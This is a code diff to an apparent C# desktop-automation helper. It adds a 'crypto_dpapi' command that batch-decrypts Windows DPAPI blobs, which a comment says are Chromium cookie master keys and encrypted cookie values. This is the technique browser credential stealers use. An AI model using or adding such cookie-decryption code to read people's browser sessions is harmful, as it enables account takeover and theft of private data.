@@ -2927,6 +2927,28 @@ class Program
                     return new { version = 1, cores = Environment.ProcessorCount, screen = new { w = sw, h = sh }, ocrLang = Ocr.Lang };
                 }
             case "ping": return new { pong = true };
+            case "crypto_dpapi":
+                {
+                    // 批量解 DPAPI blob（只读用途：Chromium v10 cookie 的主密钥封装 / 加密值）
+                    var blobs = new List<object>();
+                    if (req.TryGetProperty("blobs", out var pb) && pb.ValueKind == JsonValueKind.Array)
+                    {
+                        foreach (var it in pb.EnumerateArray())
+                        {
+                            string b64 = it.ValueKind == JsonValueKind.String ? it.GetString() : null;
+                            if (string.IsNullOrEmpty(b64)) { blobs.Add(new { ok = false, error = "empty" }); continue; }
+                            try
+                            {
+                                byte[] raw = Convert.FromBase64String(b64);
+                                byte[] plain = Dpapi.Unprotect(raw, out int werr);
+                                if (plain == null) blobs.Add(new { ok = false, error = "CryptUnprotectData failed", win32 = werr, len = raw.Length });
+                                else blobs.Add(new { ok = true, b64 = Convert.ToBase64String(plain) });
+                            }
+                            catch (Exception ex) { blobs.Add(new { ok = false, error = ex.Message }); }
+                        }
+                    }
+                    return new { results = blobs };
+                }
             case "screen_bounds": return new { x = 0, y = 0, w = Gdi.ScreenW(), h = Gdi.ScreenH() };
             case "windows": return new { windows = Win.ListWindows() };
             case "window_capture":
